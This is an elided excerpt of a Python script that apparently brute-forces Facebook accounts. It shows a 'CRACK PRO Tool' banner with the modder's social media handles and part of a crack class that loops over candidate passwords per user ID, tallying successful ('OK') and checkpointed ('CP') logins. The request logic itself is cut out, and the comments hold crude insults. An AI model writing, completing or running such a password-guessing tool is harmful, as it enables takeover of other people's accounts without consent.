...
def banner():
	print('''%s
 8888P 8888 888b. .d88b.      Yb  dP 888b. 
  dP  8www 8  .8 8P  Y8       YbdP  8   8 
 dP   8    8wwK' 8b  d8 wwww  dPYb  8   8 
d8888 8888 8  Yb `Y88P'      dP  Yb 888P'
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] MODIFIED  : ZERO
 [+] Facebook  : CHAN.MYAE.000
 [+] Github    : https://github.com/Myanmar567
 [\x1b[1;96m+%s] COUNTRY   : MYANMAR
 [\x1b[1;96m+%s] CRACK PRO Tool
 [+] 𝓬𝓻𝓮𝓭𝓲𝓽 𝓸𝓻𝓰𝓲𝓷𝓪𝓵 𝓼𝓬𝓻𝓲𝓹𝓽 🙏
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class crack:
	...
	def b_api(self,user,pwx): # Kamu jahat :v
		...
		sys.stdout.write('\r %s* %s[%scracking%s] %s/%s [zero👉OK:%s - CP:%s] %s*'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
